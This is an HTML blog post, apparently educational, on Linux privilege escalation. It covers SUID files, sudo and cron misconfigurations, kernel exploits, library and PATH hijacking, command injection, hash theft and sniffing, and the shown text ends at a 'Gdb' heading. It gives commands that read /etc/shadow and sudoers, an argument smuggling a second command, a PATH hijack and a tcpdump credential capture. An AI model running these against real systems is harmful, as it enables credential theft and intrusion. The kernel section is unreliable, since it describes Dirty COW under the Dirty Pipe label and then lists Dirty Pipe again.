@@ -1,0 +1,976 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  Privilege Escalation in Linux · pwnbuffer
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="pwnbuffer">
+<meta name="description" content="An paper on privilege escalation techniques in Linux environments">
+<meta name="keywords" content="team brazuca!">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Privilege Escalation in Linux">
+  <meta name="twitter:description" content="An paper on privilege escalation techniques in Linux environments">
+
+<meta property="og:url" content="https://pwnbuffer.org/en/posts/slayer/privesc-linux/">
+  <meta property="og:site_name" content="pwnbuffer">
+  <meta property="og:title" content="Privilege Escalation in Linux">
+  <meta property="og:description" content="An paper on privilege escalation techniques in Linux environments">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-03-22T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-03-22T00:00:00+00:00">
+    <meta property="article:tag" content="Privilege Escalation">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="Exploitation">
+    <meta property="article:tag" content="Post-Exploitation">
+
+
+
+
+<link rel="canonical" href="https://pwnbuffer.org/en/posts/slayer/privesc-linux/">
+
+
+<link rel="preload" href="https://pwnbuffer.org/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="https://pwnbuffer.org/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="https://pwnbuffer.org/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="https://pwnbuffer.org/css/coder.min.b886fe0d9034709648f91f4ce178f51dd367d9350f82dd1132d54fd69bfca66f.css" integrity="sha256-uIb&#43;DZA0cJZI&#43;R9M4Xj1HdNn2TUPgt0RMtVP1pv8pm8=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="https://pwnbuffer.org/css/coder-dark.min.165f5fe7c98269a5cfc54f81472e0f84ebc32d92bbe6c9db1f06962b0817bda1.css" integrity="sha256-Fl9f58mCaaXPxU&#43;BRy4PhOvDLZK75snbHwaWKwgXvaE=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="https://pwnbuffer.org/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="https://pwnbuffer.org/img/favicon-32x32.ico" sizes="32x32">
+<link rel="icon" type="image/png" href="https://pwnbuffer.org/img/favicon-16x16.ico" sizes="16x16">
+
+<link rel="apple-touch-icon" href="https://pwnbuffer.org/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="https://pwnbuffer.org/images/apple-touch-icon.png">
+
+<link rel="manifest" href="https://pwnbuffer.org/site.webmanifest">
+<link rel="mask-icon" href="https://pwnbuffer.org/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-dark">
+  
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="https://pwnbuffer.org/en/">
+      pwnbuffer
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="https://pwnbuffer.org/en/about/">About</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="https://pwnbuffer.org/en/posts/">Posts</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="https://pwnbuffer.org/en/categories/">Categories</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="https://pwnbuffer.org/en/members/">Members</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="https://pwnbuffer.org/en/wallpapers/">Wallpapers</a>
+            </li>
+          
+        
+        
+          
+          
+          
+            
+              
+                <li class="navigation-item menu-separator">
+                  <span>|</span>
+                </li>
+                
+              
+              <li class="navigation-item">
+                <a href="https://pwnbuffer.org/posts/slayer/privesc-linux/">🇧🇷</a>
+              </li>
+            
+          
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://pwnbuffer.org/en/posts/slayer/privesc-linux/">
+              Privilege Escalation in Linux
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2025-03-22T00:00:00Z">
+                March 22, 2025
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              13-minute read
+            </span>
+          </div>
+          <div class="authors">
+  <i class="fa-solid fa-user" aria-hidden="true"></i>
+    <a href="https://pwnbuffer.org/en/authors/slayer/">Slayer</a></div>
+
+          <div class="categories">
+  <i class="fa-solid fa-folder" aria-hidden="true"></i>
+    <a href="https://pwnbuffer.org/en/categories/hacking/">Hacking</a>
+      <span class="separator">•</span>
+    <a href="https://pwnbuffer.org/en/categories/linux/">Linux</a>
+      <span class="separator">•</span>
+    <a href="https://pwnbuffer.org/en/categories/vulnerability-exploitation/">Vulnerability-Exploitation</a></div>
+
+          <div class="tags">
+  <i class="fa-solid fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="https://pwnbuffer.org/en/tags/privilege-escalation/">Privilege Escalation</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="https://pwnbuffer.org/en/tags/linux/">Linux</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="https://pwnbuffer.org/en/tags/exploitation/">Exploitation</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="https://pwnbuffer.org/en/tags/post-exploitation/">Post-Exploitation</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <p><strong>Hi, I&rsquo;m Slayer. In this paper, I will talk about privilege escalation in Linux. I recommend that, while reading this paper, also go testing the techniques in practice, as this will help to better understand the concepts and apply the knowledge acquired more effectively.</strong></p>
+<h1 id="introduction">
+  Introduction
+  <a class="heading-link" href="#introduction">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p><strong>Privilege escalation is the process of gaining higher levels of access or control on a system than originally allowed. On Linux systems, this often involves elevating a common user to root privileges or exploiting poorly configured permissions to access restricted resources. This technique is widely used in attacks to compromise systems and extend the range of an invasion.</strong></p>
+<p><strong>Scaling privileges can occur in different ways, either to gain greater control within the same level of access or to achieve higher levels of privilege, such as root. In the next topic, we will detail the differences between horizontal and vertical scaling.</strong></p>
+<h2 id="horizontal-escalation-x-vertical-escalation">
+  Horizontal Escalation X Vertical Escalation
+  <a class="heading-link" href="#horizontal-escalation-x-vertical-escalation">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p><strong>Horizontal escalation occurs when an attacker gains access to the accounts or permissions of another user at the same privilege level, such as a co-worker on a corporate network. Vertical scaling involves obtaining higher permissions, such as that of an administrator or root, allowing full control over the system. Both methods can be used together to explore different layers of an environment.</strong></p>
+<h2 id="fundamental-concepts">
+  Fundamental Concepts
+  <a class="heading-link" href="#fundamental-concepts">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p><strong>After the introduction, before you start scaling privileges, it is obvious that you should know at least the basic and fundamental concepts of Linux, such as the operation of file permissions, groups and users, folder structure, system configuration, etc. If you do not have this basic knowledge about Linux, do not waste your time reading this paper.</strong></p>
+<h1 id="privesc-techniques-misconfigs">
+  PrivEsc Techniques (misconfigs)
+  <a class="heading-link" href="#privesc-techniques-misconfigs">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<h3 id="suid-files">
+  SUID Files
+  <a class="heading-link" href="#suid-files">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p><strong>Files with the SUID (Set User ID) permission allow the process generated by the file to run with the permissions of the owner, not the user running it. This can be a major vulnerability if SUID files are misconfigured, as any ordinary user can gain elevated privileges when running these files. A classic example would be a SUID file belonging to root that, if misconfigured or with vulnerabilities, could be exploited by an attacker to gain root access. Commands such as &ldquo;find&rdquo; can be used to locate SUID files on a system and check for vulnerable files.</strong></p>
+
+
+
+
+
+<div class="tabs tabs-code tabs-left">
+  
+
+
+
+
+<style>
+  .tabs input#tab-0-0:checked ~ .tab-content-0-0 {
+    display: block;
+  }
+</style>
+
+<input type="radio" class="tab-input" name="tab-select-0" id="tab-0-0" checked/>
+<label for="tab-0-0" class="tab-label">Bash</label>
+<div class="tab-content tab-content-0-0">
+  <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>find / -perm /4000 2&gt;/dev/null
+</span></span></code></pre></div>
+</div>
+
+
+
+
+</div>
+
+
+
+<p><strong>This command for example, searches from the root directory for files with the SUID permission enabled.</strong></p>
+<h3 id="sudo-with-misconfig">
+  Sudo With Misconfig
+  <a class="heading-link" href="#sudo-with-misconfig">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p><strong>The sudo configuration file defines who can run commands as root and which commands can be run. Incorrect configuration can allow a user to execute commands with elevated privileges without proper authentication. To check sudo configuration, use:</strong></p>
+
+
+
+
+
+<div class="tabs tabs-code tabs-left">
+  
+
+
+
+
+<style>
+  .tabs input#tab-1-0:checked ~ .tab-content-1-0 {
+    display: block;
+  }
+</style>
+
+<input type="radio" class="tab-input" name="tab-select-1" id="tab-1-0" checked/>
+<label for="tab-1-0" class="tab-label">Bash</label>
+<div class="tab-content tab-content-1-0">
+  <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo cat /etc/sudoers
+</span></span></code></pre></div>
+</div>
+
+
+
+
+</div>
+
+
+
+<p><strong>If the sudoers file allows execution of commands as root without password, or if an ordinary user has excessive permissions, this can be exploited to escalate privileges! (Note: Remembering that the file &ldquo;/etc/sudoers&rdquo; by default can only be modified and read by root!)</strong></p>
+<h3 id="crontabs-with-misconfig">
+  Crontabs With Misconfig
+  <a class="heading-link" href="#crontabs-with-misconfig">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p><strong>Crontabs are used to schedule automatic tasks. If a crontab is misconfigured, with excessive permissions, an attacker can modify the cron job to execute arbitrary commands with elevated privileges. To check crontabs, run:</strong></p>
+
+
+
+
+
+<div class="tabs tabs-code tabs-left">
+  
+
+
+
+
+<style>
+  .tabs input#tab-2-0:checked ~ .tab-content-2-0 {
+    display: block;
+  }
+</style>
+
+<input type="radio" class="tab-input" name="tab-select-2" id="tab-2-0" checked/>
+<label for="tab-2-0" class="tab-label">Bash</label>
+<div class="tab-content tab-content-2-0">
+  <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>crontab -l
+</span></span></code></pre></div>
+</div>
+
+
+
+
+</div>
+
+
+
+<p><strong>In addition, checking system crontabs can be done by inspecting the files in /etc/cron.d/ and /var/spool/cron/crontabs!</strong></p>
+<h1 id="privesc-techniques-vulnerabilities">
+  PrivEsc Techniques (Vulnerabilities)
+  <a class="heading-link" href="#privesc-techniques-vulnerabilities">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<h3 id="kernel-exploits">
+  Kernel exploits
+  <a class="heading-link" href="#kernel-exploits">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p><strong>Vulnerabilities in the Linux kernel allow attackers to elevate privileges by exploiting flaws in critical systems logic. Two of the most famous are:</strong></p>
+<p><strong><a href="https://www.hackthebox.com/blog/Dirty-Pipe-Explained-CVE-2022-0847"  class="external-link" target="_blank" rel="noopener">Dirty Pipe (CVE-2022-0847)</a>: This vulnerability occurs due to a race condition in the copy-on-write (Copy-On-Write) implementation in the Linux kernel. This allows an attacker with write access to a file, even if protected, to modify its contents. For example, a critical configuration file such as /etc/passwd can be changed to add a root user.</strong></p>
+<p><strong><a href="https://www.hackthebox.com/blog/Dirty-Pipe-Explained-CVE-2022-0847"  class="external-link" target="_blank" rel="noopener">Dirty Pipe (CVE-2022-0847)</a>: Similar to Dirty COW, but specific to systems with newer kernels. It exploits flaws in the handling of buffers in Linux pipelines. An attacker can inject data into read-only files, such as system logs, to execute malicious commands. The exploitation process involves manipulating data at the read buffer level.</strong></p>
+<p><strong>Both vulnerabilities require a specific exploit, which can be found on bases such as the <a href="https://www.exploit-db.com/"  class="external-link" target="_blank" rel="noopener">Exploit-DB</a>.</strong></p>
+<h3 id="root-services">
+  Root Services
+  <a class="heading-link" href="#root-services">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p><strong>Services running as root pose one of the biggest security risks on Linux systems, as any vulnerability in these services can be exploited to gain elevated privileges. The fact that a service runs with root privileges means that it has unrestricted access to the system, being able to modify critical files, execute privileged commands and, in many cases, compromise the integrity of the entire system. Therefore, it is essential that only the services that are really necessary for the operation of the system run with these privileges, and that they are configured correctly.</strong></p>
+<p><strong>Many services, especially web servers, databases, and file servers, often run as root to perform specific operations that require access to restricted resources. A classic example is the nginx or apache web server, which may need to access directories or files with restricted permissions, such as logs or system configuration files. If one of these services is misconfigured, an attacker could exploit flaws to inject malicious code, gain access to the system, or even escalate privileges.</strong></p>
+<p><strong>One of the most common ways of exploiting services that run as root is RCE. This occurs when an attacker manages to have the service execute arbitrary commands on the system, often by taking advantage of vulnerabilities such as buffer overflows, input validation failures, or improper authentication. An attacker could, for example, send a malicious request to a web server that allows the execution of an arbitrary script. If this server is running as root, the attacker can gain full control over the system and can create backdoors for future access. To identify which processes are running as root, you can run:</strong></p>
+
+
+
+
+
+<div class="tabs tabs-code tabs-left">
+  
+
+
+
+
+<style>
+  .tabs input#tab-3-0:checked ~ .tab-content-3-0 {
+    display: block;
+  }
+</style>
+
+<input type="radio" class="tab-input" name="tab-select-3" id="tab-3-0" checked/>
+<label for="tab-3-0" class="tab-label">Bash</label>
+<div class="tab-content tab-content-3-0">
+  <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ps aux | grep root
+</span></span></code></pre></div>
+</div>
+
+
+
+
+</div>
+
+
+
+<h3 id="dynamic-libraries">
+  Dynamic Libraries
+  <a class="heading-link" href="#dynamic-libraries">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p><strong>Dynamic library exploitation is a technique used to change the behavior of legitimate programs by causing them to load and execute malicious code. This technique is based on the operation of the Linux system, which allows programs to load external libraries during their execution. The LD_PRELOAD and LD_LIBRARY_PATH environment variables are essential in this process because they control the order in which libraries are loaded.</strong></p>
+<p><strong>The most common scanning technique involves the LD_PRELOAD variable. When a program runs with this variable configured, the system loads a specified library before any other system library. This means that by manipulating this variable, you can have the program perform functions from a library other than the original. For example, you can replace functions such as system(), execve(), or setuid() to modify the behavior of the program, allowing unwanted actions to be performed, such as executing commands with elevated privileges.</strong></p>
+<p><strong>This type of exploitation happens when a program, especially those that have high permissions, does not properly validate environment variables. This allows, by manipulating the LD_PRELOAD variable, a malicious library to be loaded before the original program. From there, the library can overwrite important functions of the program, allowing, for example, the execution of commands on the system without the legitimate program noticing.</strong></p>
+<p><strong>As an example, imagine that a program uses the system() function to execute commands. If it doesn&rsquo;t clean up the environment variables before doing so, you can create a malicious library that modifies the execution of this function, causing commands to run with root privileges. This can be done by creating a library that replaces the setuid() function to change the program user ID and grant full access to the system.</strong></p>
+<p><strong>Another form of exploitation happens with the LD_LIBRARY_PATH variable, which specifies the directories where the system searches for libraries. If a program trusts this search path in an insecure way, it is possible to manipulate the variable to point to a malicious version of a library. This causes the program to use a compromised version of the library, which can perform actions that are harmful to the system.</strong></p>
+<p><strong>In addition, there is the possibility of library hijacking, where a malicious version of a library is placed in a directory where the system expects to find libraries. If the program searches for a library in this directory, it will end up using the modified version, which allows the malicious code to run.</strong></p>
+<p><strong>Nowadays, some security measures can make these attacks difficult, such as configuring ld.so to block the manipulation of LD_PRELOAD in programs with high permissions or the use of resources such as ASLR, which makes it more difficult for an attacker to predict where libraries will be loaded into memory. However, if the right precautions are not taken, dynamic library exploration can still be an effective technique for gaining root access to systems.</strong></p>
+<h3 id="command-injection">
+  Command Injection
+  <a class="heading-link" href="#command-injection">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p><strong>Command injection occurs when a script, which runs with privileges such as root, does not properly validate the inputs it provides, allowing malicious commands to be entered and executed. This can happen in automation scripts, such as backups or file cleanup, that accept user inputs without proper verification.</strong></p>
+<p><strong>For example, a backup script that takes a directory as an argument can be manipulated to execute a malicious command, such as:</strong></p>
+
+
+
+
+
+<div class="tabs tabs-code tabs-left">
+  
+
+
+
+
+<style>
+  .tabs input#tab-4-0:checked ~ .tab-content-4-0 {
+    display: block;
+  }
+</style>
+
+<input type="radio" class="tab-input" name="tab-select-4" id="tab-4-0" checked/>
+<label for="tab-4-0" class="tab-label">Bash</label>
+<div class="tab-content tab-content-4-0">
+  <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>./backup.sh <span style="color:#ed9d13">&#34;/home/user; id&#34;</span>
+</span></span></code></pre></div>
+</div>
+
+
+
+
+</div>
+
+
+
+<p><strong>The main cause of this vulnerability is the use of functions such as eval or system, which execute commands directly, without validating the entries.</strong></p>
+<h3 id="path-hijacking">
+  Path Hijacking
+  <a class="heading-link" href="#path-hijacking">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p><strong>Path Hijacking occurs when an attacker manipulates the search path for executables on the system (using the PATH environment variable) to force the system to execute a malicious file instead of a legitimate executable. This can be done by adding attacker-controlled directories to the beginning of the PATH variable, causing programs to search for and execute compromised versions of binaries or scripts.</strong></p>
+<p><strong>For example, if the attacker manages to change the PATH variable to include a directory where a malicious binary was placed, the system may end up running that binary instead of the original one. Assume that a script or command attempts to run a program such as ls or cat. If the directory containing a malicious binary of ls or cat is listed before the default directory, the system will run the malicious binary, or which may contain code to gain elevated privileges or execute malicious commands.</strong></p>
+
+
+
+
+
+<div class="tabs tabs-code tabs-left">
+  
+
+
+
+
+<style>
+  .tabs input#tab-5-0:checked ~ .tab-content-5-0 {
+    display: block;
+  }
+</style>
+
+<input type="radio" class="tab-input" name="tab-select-5" id="tab-5-0" checked/>
+<label for="tab-5-0" class="tab-label">Bash</label>
+<div class="tab-content tab-content-5-0">
+  <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#24909d">export</span> <span style="color:#40ffff">PATH</span>=/path/malicious:<span style="color:#40ffff">$PATH</span>
+</span></span></code></pre></div>
+</div>
+
+
+
+
+</div>
+
+
+
+<p><strong>This can allow the attacker to execute commands without the system running legitimate versions of these programs.</strong></p>
+<h1 id="privesc-techniques-credentialstokens">
+  PrivEsc Techniques (Credentials/Tokens)
+  <a class="heading-link" href="#privesc-techniques-credentialstokens">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<h3 id="theft-of-hashespasswords">
+  Theft Of Hashes/Passwords
+  <a class="heading-link" href="#theft-of-hashespasswords">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p><strong>The theft of hashes and passwords occurs when an attacker can access and extract the hashes of passwords stored in files such as /etc/shadow on Linux. The /etc/shadow file stores the encrypted passwords (in hashed form) of the system users. If an attacker manages to access this file, they can attempt to crack the hashes and obtain the original passwords.</strong></p>
+<p><strong>Typically, passwords in Linux are stored in encrypted form, using algorithms such as MD5, SHA-512, or bcrypt. However, these hashing algorithms are not reversible, that is, it is not possible to directly retrieve the original password from the hash. However, with hash extraction, an attacker can use techniques such as brute force or rainbow tables to try to guess the original password.</strong></p>
+<p><strong>For example, if the attacker can read the /etc/shadow file, which contains users&rsquo; passwords, they can use tools such as John the Rapist (John the Ripper) or Hashcat to try to crack the hashes and get the passwords. The following command can be used to extract passwords from a /etc/shadow: file</strong></p>
+
+
+
+
+
+<div class="tabs tabs-code tabs-left">
+  
+
+
+
+
+<style>
+  .tabs input#tab-6-0:checked ~ .tab-content-6-0 {
+    display: block;
+  }
+</style>
+
+<input type="radio" class="tab-input" name="tab-select-6" id="tab-6-0" checked/>
+<label for="tab-6-0" class="tab-label">Bash</label>
+<div class="tab-content tab-content-6-0">
+  <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo cat /etc/shadow | grep user
+</span></span></code></pre></div>
+</div>
+
+
+
+
+</div>
+
+
+
+<p><strong>This reveals the hash of the specified user password. From there, the attacker can try to guess the password through brute force attacks or using pre-computed tables! (Note: Again saying the obvious, /etc/shadow can usually only be accessed by root.)</strong></p>
+<h3 id="keyloggers--sniffers">
+  Keyloggers &amp; Sniffers
+  <a class="heading-link" href="#keyloggers--sniffers">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p><strong>Keyloggers and sniffers are tools used to capture credentials by exploiting different points of the system. While keyloggers monitor and record everything that is typed by the keyboard, sniffers intercept and analyze network traffic to extract sensitive information, such as usernames and passwords.</strong></p>
+<p><strong>Keyloggers can be implemented as software or hardware. In the case of software, they integrate with the S.O to record keyboard inputs. A keylogger can be installed on a compromised system through malware, social engineering, or physical access. Once active, it records everything the user types, including credentials used for login, access to banking services, and other sensitive data.</strong></p>
+<p><strong>For example, a simple keylogger can be implemented as an LKM that intercepts keyboard-related system calls. This can be done in Linux by manipulating devices such as /dev/input/ to capture keystrokes. The log generated by the keylogger can be stored locally or sent to a remote server.</strong></p>
+<p><strong>Sniffers work by intercepting packets of data that travel across the network. They are especially effective on unencrypted networks, where sensitive information such as credentials can be captured in plain text. Tools such as Wire Shark (Wireshark) or tcpdump are used to capture and analyze packets. For example, on an unprotected network, an attacker might use a command such as:</strong></p>
+
+
+
+
+
+<div class="tabs tabs-code tabs-left">
+  
+
+
+
+
+<style>
+  .tabs input#tab-7-0:checked ~ .tab-content-7-0 {
+    display: block;
+  }
+</style>
+
+<input type="radio" class="tab-input" name="tab-select-7" id="tab-7-0" checked/>
+<label for="tab-7-0" class="tab-label">Bash</label>
+<div class="tab-content tab-content-7-0">
+  <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>tcpdump -i eth0 -A port <span style="color:#3677a9">80</span>
+</span></span></code></pre></div>
+</div>
+
+
+
+
+</div>
+
+
+
+<p><strong>This command captures HTTP (not encrypted) traffic on the eth0 network interface, where credentials sent in forms can be intercepted.</strong></p>
+<h1 id="automatic-tools">
+  Automatic Tools
+  <a class="heading-link" href="#automatic-tools">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<h2 id="linpeashttpsgithubcompeass-ngpeass-ng">
+  <a href="https://github.com/peass-ng/PEASS-ng"  class="external-link" target="_blank" rel="noopener">LinPEAS</a>
+  <a class="heading-link" href="#linpeashttpsgithubcompeass-ngpeass-ng">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p><strong>LinPEAS (Linux Privilege Escalation Awesome Script) is an audit tool that automates the search for privilege escalation vectors on Linux systems. It scans the system for vulnerabilities such as unsafe settings, SUID files, incorrect permissions, misconfigured services, and more. LinPEAS is widely used for its detailed and comprehensive approach.</strong></p>
+<h2 id="linux-exploit-suggesterhttpsgithubcomthe-z-labslinux-exploit-suggester">
+  <a href="https://github.com/The-Z-Labs/linux-exploit-suggester"  class="external-link" target="_blank" rel="noopener">Linux Exploit Suggester</a>
+  <a class="heading-link" href="#linux-exploit-suggesterhttpsgithubcomthe-z-labslinux-exploit-suggester">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p><strong>Linux Exploit Suggester is a tool that identifies possible Linux kernel vulnerabilities on the target system. Based on the kernel version, it suggests known exploits that can be used to gain elevated privileges. It is especially useful for determining specific exploits that can be applied to the system.</strong></p>
+<h2 id="gtfobinshttpsgtfobinsgithubio">
+  <a href="https://gtfobins.github.io/"  class="external-link" target="_blank" rel="noopener">GTFOBins</a>
+  <a class="heading-link" href="#gtfobinshttpsgtfobinsgithubio">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p><strong>GTFOBins is a collection of Unix binaries that can be exploited to scale privileges, execute commands, or escape from restricted environments such as chroot or containers. The platform offers an online database and allows you to search for specific binaries and the associated exploitation methods. It is an indispensable tool for pentesters and security researchers.</strong></p>
+<h1 id="useful-tools">
+  Useful Tools
+  <a class="heading-link" href="#useful-tools">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<h2 id="strace">
+  Strace
+  <a class="heading-link" href="#strace">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p><strong>Strace is a tool that allows you to track syscalls made by a running process. It is widely used for debugging and behavior analysis of programs. By looking at syscalls, you can identify interactions with files, networks, or even vulnerabilities in poorly designed binaries.</strong></p>
+
+
+
+
+
+<div class="tabs tabs-code tabs-left">
+  
+
+
+
+
+<style>
+  .tabs input#tab-8-0:checked ~ .tab-content-8-0 {
+    display: block;
+  }
+</style>
+
+<input type="radio" class="tab-input" name="tab-select-8" id="tab-8-0" checked/>
+<label for="tab-8-0" class="tab-label">Bash</label>
+<div class="tab-content tab-content-8-0">
+  <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>strace -o output.txt ./programa
+</span></span></code></pre></div>
+</div>
+
+
+
+
+</div>
+
+
+
+<h2 id="ltrace">
+  Ltrace
+  <a class="heading-link" href="#ltrace">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p><strong>Ltrace is similar to strace, but focuses on tracking calls to dynamic libraries (such as libc). It is useful for observing interactions with functions such as printf, malloc, or specific calls to external libraries, which can reveal vulnerabilities or unexpected behaviors.</strong></p>
+
+
+
+
+
+<div class="tabs tabs-code tabs-left">
+  
+
+
+
+
+<style>
+  .tabs input#tab-9-0:checked ~ .tab-content-9-0 {
+    display: block;
+  }
+</style>
+
+<input type="radio" class="tab-input" name="tab-select-9" id="tab-9-0" checked/>
+<label for="tab-9-0" class="tab-label">Bash</label>
+<div class="tab-content tab-content-9-0">
+  <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ltrace ./programa
+</span></span></code></pre></div>
+</div>
+
+
+
+
+</div>
+
+
+
+<h2 id="gdb">
+  Gdb
+  <a class="heading-link" href="#gdb">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
